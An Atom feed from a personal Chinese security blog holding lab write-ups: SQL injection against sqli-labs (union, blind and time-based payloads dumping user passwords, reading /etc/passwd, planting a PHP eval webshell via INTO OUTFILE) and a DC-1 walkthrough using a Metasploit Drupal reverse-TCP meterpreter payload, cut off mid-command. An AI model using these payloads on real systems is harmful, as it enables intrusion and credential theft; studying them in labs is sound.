<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>fogpost`s little blog</title>
  
  
  <link href="https://fogpost.top/atom.xml" rel="self"/>
  
  <link href="https://fogpost.top/"/>
  <updated>2024-11-24T09:22:24.841Z</updated>
  <id>https://fogpost.top/</id>
  
  <author>
    <name>fogpost</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sqli练习</title>
    <link href="https://fogpost.top/2024/11/24/sqli%E7%BB%83%E4%B9%A0/"/>
    <id>https://fogpost.top/2024/11/24/sqli%E7%BB%83%E4%B9%A0/</id>
    <published>2024-11-24T09:12:33.000Z</published>
    <updated>2024-11-24T09:22:24.841Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqli开头简介"><a href="#sqli开头简介" class="headerlink" title="sqli开头简介"></a>sqli开头简介</h1><p>sql注入我们可以理解为，通过构造恶意的输入，从而让程序执行我们想要执行的代码。所以我们需要了解源代码中的sql注入是什么样的语句什么样的过滤，但是在黑盒中我们无法了解代码，这便需要我们去有足够的知识积累，所以我打算将这个靶场打完，我要做sql领域大神🥰！</p><h1 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h1><p>联合查询特点：<br>1、要求多条查询语句的查询列数是一致的！<br>2、要求多条查询语句的查询的每一列的类型和顺序最好一致<br>3、union关键字默认去重，如果使用union all 可以包含重复项  </p><p>version():查看数据库版本<br>database():查看使用的数据库<br>user():查看当前用户<br>limit:limit子句分批来获取所有数据<br>group_concat():一次性获取所有的数据库信息</p><p>information_schema.tables:包含了数据库里所有的表<br>table_name:表名<br>table_schema:数据库名<br>column_name:字段名</p><p>–dbs:是查看所有的数据库<br>–tables:是查看所有的表<br>–columns:是查看表中所有的字段名<br>–dump:是查询哪个表的数据</p><h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><ol><li>首先我们输入1，发现返回正常输入?id&#x3D;1’，返回错误，说明存在单引号注入<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060247359.png" srcset="/img/loading.gif" lazyload></li><li>输入?id&#x3D;1’ and ‘1’&#x3D;’1，页面回显正常<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060248949.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 1–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 2–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 3–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 4–+　　出现报错界面<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060250107.png" srcset="/img/loading.gif" lazyload><br>所以我们了解到了数据库表只有三列，确定了字段数</li><li>构造联合查询?id&#x3D;-1’ union select 1,2,3–+前面的id为-1，使前面的语句无效，用union查询是否有回显，发现2和3有回显<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060254643.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;-1’ union select 1,database(),version()–+发现回显了数据库名称和版本信息<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060256922.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+发现回显了数据库中的表名<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060259924.png" srcset="/img/loading.gif" lazyload></li><li>查询users的字段名?id&#x3D;-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;’users’–+<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060302469.png" srcset="/img/loading.gif" lazyload></li><li>查询users表中的内容-1’ union select 1,2,group_concat(0x5c,username,0x5c,password) from users –+ 0x5c是反斜杠的十六进制，用于连接这两个库的数据内容<br>这个是手工注入的基本，大部分的注入都是围绕上面来优化的</li></ol><h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><p>sqlmap -u <a href="http://sql/sqli-labs-master/Less-1/id=1">http://sql/sqli-labs-master/Less-1/id=1</a> –dbs 查看对应的库<br>之后还会专门出一个sqlmap的教程，这里就不多说了</p><h1 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h1><p>?id&#x3D;1’and length((select database()))&gt;9–+<br>#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4<br>?id&#x3D;1’and ascii(substr((select database()),1,1))&#x3D;115–+<br>#substr(“78909”,1,1)&#x3D;7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。</p><p>?id&#x3D;1’and length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&gt;13–+<br>判断所有表名字符长度。<br>?id&#x3D;1’and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;99–+<br>逐一判断表名</p><p>?id&#x3D;1’and length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20–+<br>判断所有字段名的长度<br>?id&#x3D;1’and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),1,1))&gt;99–+<br>逐一判断字段名。</p><p>?id&#x3D;1’ and length((select group_concat(username,password) from users))&gt;109–+<br>判断字段内容长度<br>?id&#x3D;1’ and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50–+<br>逐一检测内容。</p><h2 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h2><p><a href="https://blog.csdn.net/xiayun1995/article/details/86512290">参考文献</a></p><p>在了解了bool盲注的基本原理之后我们发现一个问题，手工注入必然会导致时间过程，于是应运而生，我们的双查询注入可以帮助我们避免长时间的枯燥操作直接获取数据库的信息，在讲解之前我们要先了解几个函数</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>rand()：随机数函数 返回一个0到1的数<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241656811.png" srcset="/img/loading.gif" lazyload><br>floor()：向下取整，floor的向下取整可以帮我们进行去整处理，加入乘法便可以构建任意随机数选择<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241658373.png" srcset="/img/loading.gif" lazyload><br>concat()：字符串连接函数，用于连接我们查询到的数据<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241701358.png" srcset="/img/loading.gif" lazyload><br>group by：分组 as (_<em>别名)：给查询结果起别名(括号中为自定义的别名)<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241707695.png" srcset="/img/loading.gif" lazyload><br>count()：聚合函数<br>这里利用count(</em>)对前面的返回数据进行统计，由于group by 和随机数的原因，有可能会出现重复的键值，当键值重复时就会触发错误，然后报错，由于子查询在错误发生之前就已经完成，所以子查询的内容会随着报错信息一起显示出来<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241709101.png" srcset="/img/loading.gif" lazyload><br>我们这里需要的是第一次的报错，因为在实际过程中我们不可能查询到正确消息，只有在可能遇到错误时才会有返回值</p><h3 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h3><p>子查询：内部查询，允许把另一个查询嵌套到当前的查询中</p><blockquote><p>MariaDB [dvwa]&gt; SELECT concat(“test: “,(select database())) as a;<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241654803.png" srcset="/img/loading.gif" lazyload><br>操作开始便会先查询(select database())，然后将查询结果与”test: “连接起来，最后返回结果。</p></blockquote><p>在注入的过程中我们不了解库名库表，可以借用information_schema的库来猜测，其中information_schema.schemata中包含了mysql的所有库名，information_schema.tables中包含了所有的表名，information_schema.columns中包含了所有的列名<br><img src="https://gitee.com/fogpost/photo/raw/master/202411241703198.png" srcset="/img/loading.gif" lazyload></p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>?id&#x3D;1’ and if(1&#x3D;1,sleep(5),1)–+<br>判断参数构造。<br>?id&#x3D;1’and if(length((select database()))&gt;9,sleep(5),1)–+<br>判断数据库名长度</p><p>?id&#x3D;1’and if(ascii(substr((select database()),1,1))&#x3D;115,sleep(5),1)–+<br>逐一判断数据库字符<br>?id&#x3D;1’and if(length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&gt;13,sleep(5),1)–+<br>判断所有表名长度</p><p>?id&#x3D;1’and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;99,sleep(5),1)–+<br>逐一判断表名<br>?id&#x3D;1’and if(length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20,sleep(5),1)–+<br>判断所有字段名的长度</p><p>?id&#x3D;1’and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),1,1))&gt;99,sleep(5),1)–+<br>逐一判断字段名。<br>?id&#x3D;1’ and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)–+<br>判断字段内容长度</p><p>?id&#x3D;1’ and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)–+<br>逐一检测内容。</p><h1 id="通过sql来getshell"><a href="#通过sql来getshell" class="headerlink" title="通过sql来getshell"></a>通过sql来getshell</h1><h2 id="条件和原理"><a href="#条件和原理" class="headerlink" title="条件和原理"></a>条件和原理</h2><blockquote><p>条件：<br> root权限<br> 知道网站根目录绝对路径<br> secure_file_priv为空或指定目录（@@secure_file_priv参数可以其值）<br> gpc关闭<br>原理：<br> 写入webshell，通过参数执行系统命令，结束后删除webshell<br>附：sqlserver getshell条件和原理<br> 条件：<br>  支持外连<br>  有sa权限<br> 原理：<br>  开启xp_cmd扩展执行系统命令  </p></blockquote><h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><blockquote><p>?id&#x3D;-1)))))) union select load_file(‘&#x2F;etc&#x2F;passwd’),2%23<br>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;ash<br>bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin<br>daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin<br>adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin<br>lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin<br>sync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;sync<br>shutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdown<br>halt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;halt<br>mail:x:8:12:mail:&#x2F;var&#x2F;mail:&#x2F;sbin&#x2F;nologin<br>news:x:9:13:news:&#x2F;usr&#x2F;lib&#x2F;news:&#x2F;sbin&#x2F;nologin<br>uucp:x:10:14:uucp:&#x2F;var&#x2F;spool&#x2F;uucppublic:&#x2F;sbin&#x2F;nologin<br>operator:x:11:0:operator:&#x2F;root:&#x2F;sbin&#x2F;nologin<br>man:x:13:15:man:&#x2F;usr&#x2F;man:&#x2F;sbin&#x2F;nologin<br>postmaster:x:14:12:postmaster:&#x2F;var&#x2F;mail:&#x2F;sbin&#x2F;nologin<br>cron:x:16:16:cron:&#x2F;var&#x2F;spool&#x2F;cron:&#x2F;sbin&#x2F;nologin<br>ftp:x:21:21::&#x2F;var&#x2F;lib&#x2F;ftp:&#x2F;sbin&#x2F;nologin<br>sshd:x:22:22:sshd:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin<br>at:x:25:25:at:&#x2F;var&#x2F;spool&#x2F;cron&#x2F;atjobs:&#x2F;sbin&#x2F;nologin<br>squid:x:31:31:Squid:&#x2F;var&#x2F;cache&#x2F;squid:&#x2F;sbin&#x2F;nologin<br>xfs:x:33:33:X Font Server:&#x2F;etc&#x2F;X11&#x2F;fs:&#x2F;sbin&#x2F;nologin<br>games:x:35:35:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologin<br>cyrus:x:85:12::&#x2F;usr&#x2F;cyrus:&#x2F;sbin&#x2F;nologin<br>vpopmail:x:89:89::&#x2F;var&#x2F;vpopmail:&#x2F;sbin&#x2F;nologin<br>ntp:x:123:123:NTP:&#x2F;var&#x2F;empty:&#x2F;sbin&#x2F;nologin<br>smmsp:x:209:209:smmsp:&#x2F;var&#x2F;spool&#x2F;mqueue:&#x2F;sbin&#x2F;nologin<br>guest:x:405:100:guest:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin<br>nobody:x:65534:65534:nobody:&#x2F;:&#x2F;sbin&#x2F;nologin<br>www-data:x:82:82:Linux User,,,:&#x2F;home&#x2F;www-data:&#x2F;sbin&#x2F;nologin<br>mysql:x:100:101:mysql:&#x2F;var&#x2F;lib&#x2F;mysql:&#x2F;sbin&#x2F;nologin<br>nginx:x:101:102:nginx:&#x2F;var&#x2F;lib&#x2F;nginx:&#x2F;sbin&#x2F;nologin</p></blockquote><h2 id="读取nginx配置文件，寻找网站根目录"><a href="#读取nginx配置文件，寻找网站根目录" class="headerlink" title="读取nginx配置文件，寻找网站根目录"></a>读取nginx配置文件，寻找网站根目录</h2><blockquote><p>?id&#x3D;-1)))))) union select load_file(‘&#x2F;etc&#x2F;nginx&#x2F;nginx.conf’),2%23<br>Array ( [0] &#x3D;&gt; Array ( [username] &#x3D;&gt; daemon off; worker_processes auto; error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log warn; events { worker_connections 1024; } http { include &#x2F;etc&#x2F;nginx&#x2F;mime.types; default_type application&#x2F;octet-stream; sendfile on; keepalive_timeout 65; server { listen 80; server_name localhost; root &#x2F;var&#x2F;www&#x2F;html; index index.php; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; location &#x2F; { try_files $uri $uri&#x2F; &#x2F;index.php?$args; } location ~ .php$ { try_files $uri &#x3D;404; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; } } } [password] &#x3D;&gt; 2 ) )</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">Array</span><br>(<br>    [<span class="hljs-number">0</span>] =&gt; <span class="hljs-title function_ invoke__">Array</span><br>        (<br>            [username] =&gt; daemon off;<br><br>worker_processes  auto;<br><br>error_log  /<span class="hljs-keyword">var</span>/log/nginx/error.log warn;<br><br>events &#123;<br>    worker_connections  <span class="hljs-number">1024</span>;<br>&#125;<br><br>http &#123;<br>    <span class="hljs-keyword">include</span>       /etc/nginx/mime.types;<br>    default_type  application/octet-stream;<br>    sendfile        on;<br>    keepalive_timeout  <span class="hljs-number">65</span>;<br><br>    server &#123;<br>        listen       <span class="hljs-number">80</span>;<br>        server_name  localhost;<br>        root         /<span class="hljs-keyword">var</span>/www/html;<br>        index index.php;<br><br>        proxy_set_header Host <span class="hljs-variable">$host</span>;<br>        proxy_set_header X-Real-IP <span class="hljs-variable">$remote_addr</span>;<br>        proxy_set_header X-Forwarded-For <span class="hljs-variable">$proxy_add_x_forwarded_for</span>;<br><br>        location / &#123;<br>            try_files <span class="hljs-variable">$uri</span>  <span class="hljs-variable">$uri</span>/ /index.php?<span class="hljs-variable">$args</span>;<br>        &#125;<br><br>        location ~ \.php$ &#123;<br>            try_files <span class="hljs-variable">$uri</span> =<span class="hljs-number">404</span>;<br>            fastcgi_pass   <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">9000</span>;<br>            fastcgi_index  index.php;<br>            <span class="hljs-keyword">include</span>        fastcgi_params;<br>            fastcgi_param  SCRIPT_FILENAME  <span class="hljs-variable">$document</span>_root<span class="hljs-variable">$fastcgi_script_name</span>;<br>        &#125;<br><br>    &#125;<br>&#125;<br>            [password] =&gt; <span class="hljs-number">2</span><br>        )<br><br>)<br></code></pre></td></tr></table></figure><h2 id="写入php探针"><a href="#写入php探针" class="headerlink" title="写入php探针:"></a>写入php探针:</h2><blockquote><p>?id&#x3D;-1)))))) union select ‘<?php phpinfo();?>‘,2 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;info.php’%23<br><a href="http://node6.anna.nssctf.cn:28413/info.php">http://node6.anna.nssctf.cn:28413/info.php</a></p></blockquote><h2 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h2><blockquote><p>?id&#x3D;-1)))))) union select ‘<?php eval($_POST["cc"]);?>‘,2 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;cc.php’%23<br>蚁剑连接：<a href="http://node6.anna.nssctf.cn:28413/cc.php">http://node6.anna.nssctf.cn:28413/cc.php</a> 密码cc</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sqli开头简介&quot;&gt;&lt;a href=&quot;#sqli开头简介&quot; class=&quot;headerlink&quot; title=&quot;sqli开头简介&quot;&gt;&lt;/a&gt;sqli开头简介&lt;/h1&gt;&lt;p&gt;sql注入我们可以理解为，通过构造恶意的输入，从而让程序执行我们想要执行的代码。所以我们需要</summary>
      
    
    
    
    <category term="网络" scheme="https://fogpost.top/categories/%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="sql" scheme="https://fogpost.top/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>dvwa全解</title>
    <link href="https://fogpost.top/2024/11/23/dvwa%E5%85%A8%E8%A7%A3/"/>
    <id>https://fogpost.top/2024/11/23/dvwa%E5%85%A8%E8%A7%A3/</id>
    <published>2024-11-23T04:35:02.000Z</published>
    <updated>2024-11-23T04:44:38.698Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>说到靶机，那么经典的dvwa靶机肯定不能错过，它是一款非常适合新手入门的靶机，它集成了多种漏洞，并且可以自由选择难度，非常适合新手入门，想玩的话自己搭建就好，我这是在服务器上搭的，用来玩玩</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><p>随便输入后便是这个返回值，说明密码错误<br><img src="https://gitee.com/fogpost/photo/raw/master/202411231240412.png" srcset="/img/loading.gif" lazyload><br>我们用抓包软件抓包，然后发送到repeat<br><img src="https://gitee.com/fogpost/photo/raw/master/202411231244582.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;说到靶机，那么经典的dvwa靶机肯定不能错过，它是一款非常适合新手入门的靶机，它集成了多种漏洞，并且可以自由选择难度，非常适合新手入门，想玩</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://fogpost.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="dvwa" scheme="https://fogpost.top/tags/dvwa/"/>
    
  </entry>
  
  <entry>
    <title>vulhub搭建</title>
    <link href="https://fogpost.top/2024/11/21/vulhub%E6%90%AD%E5%BB%BA/"/>
    <id>https://fogpost.top/2024/11/21/vulhub%E6%90%AD%E5%BB%BA/</id>
    <published>2024-11-21T11:22:56.000Z</published>
    <updated>2024-11-21T12:09:19.570Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>涉及一些经典的漏洞和靶场环境，如果有现成的可以下载固然很好，但是当需要我们自己复现和搭建环境时便会出现许多的bug，这时便需要一个较好的工具来实现便捷的靶场环境构建，这个工具便是vulhub，它是一个基于docker的漏洞环境集合，方便我们快速搭建漏洞环境，作者是p牛也是人尽皆知的离别歌，可以去看看人家的博客网</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>vulhub是个基于docker的工具平台，自行下载docker和docker-compose</p><h2 id="下载Vulhub"><a href="#下载Vulhub" class="headerlink" title="下载Vulhub"></a>下载Vulhub</h2><p>任意创建一个文件夹,从github获取对应的靶场环境,然后进入vulhub目录</p><blockquote><p>git clone <a href="https://github.com/vulhub/vulhub.git">https://github.com/vulhub/vulhub.git</a><br>cd vulhub</p></blockquote><p>随便进入一个目录,比如shiro,ls+cd进入想要的cve文件中启动docker-compose<br>即可创建靶场，注意内存资源的分配，以及部分漏洞各个工具的版本问题<br><img src="https://gitee.com/fogpost/photo/raw/master/202411211945375.png" srcset="/img/loading.gif" lazyload></p><p>搭建还是挺简单的</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;涉及一些经典的漏洞和靶场环境，如果有现成的可以下载固然很好，但是当需要我们自己复现和搭建环境时便会出现许多的bug，这时便需要一个较好的工具</summary>
      
    
    
    
    <category term="工具" scheme="https://fogpost.top/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="tool" scheme="https://fogpost.top/tags/tool/"/>
    
  </entry>
  
  <entry>
    <title>服务器更新计划和流程</title>
    <link href="https://fogpost.top/2024/11/20/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9B%B4%E6%96%B0%E8%AE%A1%E5%88%92%E5%92%8C%E6%B5%81%E7%A8%8B/"/>
    <id>https://fogpost.top/2024/11/20/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9B%B4%E6%96%B0%E8%AE%A1%E5%88%92%E5%92%8C%E6%B5%81%E7%A8%8B/</id>
    <published>2024-11-20T09:26:30.000Z</published>
    <updated>2024-11-20T09:26:30.000Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>DC-提权靶机</title>
    <link href="https://fogpost.top/2024/11/19/DC-%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BA/"/>
    <id>https://fogpost.top/2024/11/19/DC-%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BA/</id>
    <published>2024-11-19T03:58:32.000Z</published>
    <updated>2024-11-20T09:24:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>学习web怎么可以少了对靶机的攻击呢，渗透方向的学习必须要有靶机攻击的基础，前几天看到一篇文章发现DC系列正好可以来训练自己的水平和对工具的理解和使用</p><h1 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h1><p>攻击机 kali2024.3<br>靶机 DC系列</p><h1 id="具体攻击"><a href="#具体攻击" class="headerlink" title="具体攻击"></a>具体攻击</h1><h2 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="目标机ip"><a href="#目标机ip" class="headerlink" title="目标机ip"></a>目标机ip</h4><p>在利用ifconfig了解知道自己的ip为192.168.56.135后利用nmap扫描同网段存活主机</p><blockquote><p>nmap -sP 192.168.56.135&#x2F;24<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191207141.png" srcset="/img/loading.gif" lazyload></p></blockquote><p>也可以利用arp-scan:</p><blockquote><p>arp-scan -l<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191209537.png" srcset="/img/loading.gif" lazyload></p></blockquote><p>获取到目标机ip为192.168.56.146</p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><blockquote><p>nmap -A 192.168.56.146，详细扫描了对应的服务和版本<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191211378.png" srcset="/img/loading.gif" lazyload></p></blockquote><h4 id="目标访问"><a href="#目标访问" class="headerlink" title="目标访问"></a>目标访问</h4><p>我们发现存在80端口，利用web访问这个ip地址发现登录页面<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191214818.png" srcset="/img/loading.gif" lazyload><br>利用目录扫描工具，查看这个ip的目录文件</p><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>利用whatweb工具识别web服务器的指纹，在火狐上面有个好用的工具叫做wapper，也可以查看对应的cms服务，不过可能需要网速比较快才好</p><blockquote><p>whatweb -v 192.168.56.146,扫描到主要的系统版本，服务号和php版本<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191219907.png" srcset="/img/loading.gif" lazyload><br>wapper：<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191218063.png" srcset="/img/loading.gif" lazyload><br>发现CMS为Drupal，版本为7</p></blockquote><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>发现cms便可以尝试一下msf来使用现成的攻击模块了</p><h4 id="msfconsole获取session"><a href="#msfconsole获取session" class="headerlink" title="msfconsole获取session"></a>msfconsole获取session</h4><blockquote><p>msfconsole ，利用search命令搜索cms的漏洞<br>search Drupal<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191223407.png" srcset="/img/loading.gif" lazyload><br>发现序号为1的可以使用，我们完成设定好攻击模块的各个参数<br>use 1<br>show payloads<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191225109.png" srcset="/img/loading.gif" lazyload><br>我们发现，这些payload和前面出现的tcp端口可能有关系所以选择payload为php&#x2F;meterpreter&#x2F;reverse_tcp<br>set payload php&#x2F;meterpreter&#x2F;reverse_tcp<br>show options<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191227042.png" srcset="/img/loading.gif" lazyload><br>yes为必填大部分已经完成我们设计好攻击机ip，RHOSTS即可<br>set rhosts 192.168.56.146<br>exploit<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191229430.png" srcset="/img/loading.gif" lazyload><br>执行完成获取session  </p></blockquote><h4 id="获取shell登录sql"><a href="#获取shell登录sql" class="headerlink" title="获取shell登录sql"></a>获取shell登录sql</h4><blockquote><p>获取DC-1的信息和shell，运用python反弹，获取更好的交互<br>sysinfo shell<br>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191233860.png" srcset="/img/loading.gif" lazyload><br>ls+cat查看flag1<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191235094.png" srcset="/img/loading.gif" lazyload><br>利用find . -name “set*”查找set文件<br>发现settings文件,查看文件，发现flag和数据库信息<br><img src="https://gitee.com/fogpost/photo/raw/master/202411191237652.png" srcset="/img/loading.gif" lazyload><br>使用数据库账户和密码来登录数据库<br>mysql -udbuser -pR0ck3t<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201642780.png" srcset="/img/loading.gif" lazyload><br>show databases;查看数据库<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201642468.png" srcset="/img/loading.gif" lazyload><br>use drupaldb; show tables;查看表,发现users表<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201644727.png" srcset="/img/loading.gif" lazyload><br>看表select * from users;看表结构desc users;<br>发现name和pass列<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201646673.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202411201647915.png" srcset="/img/loading.gif" lazyload></p></blockquote><h4 id="覆盖admin密码登录"><a href="#覆盖admin密码登录" class="headerlink" title="覆盖admin密码登录"></a>覆盖admin密码登录</h4><blockquote><p>查看加密方式，搜索文件， find . -name “password*”<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201651432.png" srcset="/img/loading.gif" lazyload><br>查看password-hash.sh,发现为php加密文件，了解发现是使用 Drupal 的密码算法（基于 PBKDF2 和可配置的工作因子）生成一个加盐的安全哈希，没能力搞不懂我们用它来生成一个密码的哈希值，然后用这个哈希值去覆盖来登录<br>php  .&#x2F;scripts&#x2F;password-hash.sh  123456<br><img src="https://gitee.com/fogpost/photo/raw/master/202411201656246.png" srcset="/img/loading.gif" lazyload><br>hash: $S$Dyi0o5A9rq9O4imggBtz.INzLGWgqCjo67vC15JYgHjEVtkpdV&#x2F;F<br>覆盖admin的密码<br>mysql&gt;update users set 